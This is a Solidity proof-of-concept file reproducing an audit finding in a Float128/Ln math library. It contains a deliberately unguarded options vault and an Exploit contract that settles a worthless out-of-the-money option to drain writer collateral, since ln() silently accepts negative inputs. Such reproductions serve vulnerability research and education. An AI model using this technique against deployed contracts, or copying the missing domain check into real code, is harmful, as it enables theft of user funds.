// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Real-source reproduction of AuditVault 55705 / Code4rena Forte H-03 (commit 4d6694f6) for
// the in-browser EVM Playground. No cheatcodes. The REAL (audited, byte-identical) Float128 +
// Ln library is IMPORTED from ../src; the minimal consumer (MiniERC20 + SpreadOptionVault) is
// inlined below so the debugger renders its source. Ln is a `public`-function library, so it
// is linked (delegatecalled) at the fixed address 0x6c6e ("ln") pinned in the registry
// foundry.toml; its runtime is injected into anvil_state.json at that address.
import {packedFloat} from "../src/Types.sol";
import {Float128} from "../src/Float128.sol";
import {Ln} from "../src/Ln.sol";

/// @notice Minimal real ERC20 — the settlement asset boundary. Full transfer accounting so the
/// harm is a genuine token balance delta, not a mock.
contract MiniERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _n, string memory _s, uint8 _d) {
        name = _n;
        symbol = _s;
        decimals = _d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        _xfer(f, to, amt);
        return true;
    }

    function _xfer(address f, address to, uint256 amt) internal {
        require(balanceOf[f] >= amt, "balance");
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
    }
}

/// @notice A cash-settled "log-contract" options vault built on Forte's Float128 / Ln. A holder
/// position pays off `notional * ln(settlePrice - strike)` (positive only in the money). The
/// vault TRUSTS Ln.ln to reject non-positive inputs (a math library is expected to fail on an
/// invalid domain — the guarantee finding 55705 says the library must uphold), so it does not
/// itself guard `delta > 0`. Because Ln.ln silently returns ln(|delta|) for delta <= 0, an
/// OUT-OF-THE-MONEY holder is paid as if in the money, draining writer collateral.
contract SpreadOptionVault {
    using Float128 for packedFloat;

    MiniERC20 public immutable asset;
    uint256 public collateral;
    uint8 public constant PAYOUT_DECIMALS = 18;

    struct Position {
        address holder;
        packedFloat notional;
        packedFloat strike;
        bool settled;
    }

    Position[] public positions;

    constructor(MiniERC20 _asset) {
        asset = _asset;
    }

    function fund(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        collateral += amount;
    }

    function open(address holder, packedFloat notional, packedFloat strike) external returns (uint256 id) {
        id = positions.length;
        positions.push(Position({holder: holder, notional: notional, strike: strike, settled: false}));
    }

    function settle(uint256 id, packedFloat settlePrice) external returns (uint256 payout) {
        Position storage p = positions[id];
        require(!p.settled, "settled");
        p.settled = true;

        // delta = settlePrice - strike. For an OTM expiry (settlePrice < strike) this is a
        // NEGATIVE Float128 and ln() SHOULD revert (log domain is x > 0) -> payout 0. It doesn't.
        packedFloat delta = settlePrice.sub(p.strike);
        packedFloat payoffPF = p.notional.mul(Ln.ln(delta));

        payout = _toTokenAmount(payoffPF);
        require(payout <= collateral, "insolvent");
        collateral -= payout;
        asset.transfer(p.holder, payout);
    }

    function _toTokenAmount(packedFloat pf) internal pure returns (uint256) {
        (int256 m, int256 e) = Float128.decode(pf);
        require(m >= 0, "negative payoff");
        int256 te = e + int256(uint256(PAYOUT_DECIMALS));
        if (te >= 0) return uint256(m) * (10 ** uint256(te));
        return uint256(m) / (10 ** uint256(-te));
    }
}

/// @dev The honest writer: mints its OWN collateral and backs the vault. Its funds are the
/// victim pool the attacker drains.
contract Writer {
    constructor(MiniERC20 asset, SpreadOptionVault vault, uint256 amount) {
        asset.mint(address(this), amount);
        asset.approve(address(vault), type(uint256).max);
        vault.fund(amount);
    }
}

contract Exploit {
    MiniERC20 public asset;
    SpreadOptionVault public vault;
    Writer public writer;
    uint256 public otmId;
    uint256 public stolen;
    bool public proven;

    // exact ln(2) * 1000 at 18 decimals — what an OTM (worthless) option MUST NOT pay.
    uint256 internal constant EXPECTED_THEFT = 693147180559945309417;

    constructor() {
        asset = new MiniERC20("USD Stable", "USD", 18);
        vault = new SpreadOptionVault(asset);

        // A separate writer posts 10,000 collateral tokens to back the vault.
        writer = new Writer(asset, vault, 10_000e18);

        // Attacker opens an option struck at 100 with notional 1000, holder = attacker (this).
        packedFloat notional = Float128.toPackedFloat(1000, 0);
        packedFloat strike = Float128.toPackedFloat(100, 0);
        otmId = vault.open(address(this), notional, strike);
    }

    function run() external payable {
        uint256 before = asset.balanceOf(address(this));
        uint256 collBefore = vault.collateral();

        // Settle OUT OF THE MONEY: expiry price 98 < strike 100. delta = 98 - 100 = -2 (a
        // NEGATIVE Float128). A spec-correct ln would revert -> this worthless option MUST pay 0.
        // Forte's Ln.ln silently returns ln(|-2|) = ln(2), so the vault pays the attacker.
        uint256 payout = vault.settle(otmId, Float128.toPackedFloat(98, 0));

        stolen = asset.balanceOf(address(this)) - before;
        uint256 collLost = collBefore - vault.collateral();

        // Concrete harm: a worthless (out-of-the-money) option paid the attacker ~693.15 real
        // collateral tokens, drained one-for-one from the writer's collateral.
        require(payout == EXPECTED_THEFT, "unexpected payout");
        require(stolen == EXPECTED_THEFT, "attacker did not receive stolen collateral");
        require(collLost == EXPECTED_THEFT, "writer collateral not drained");
        proven = true;
    }
}
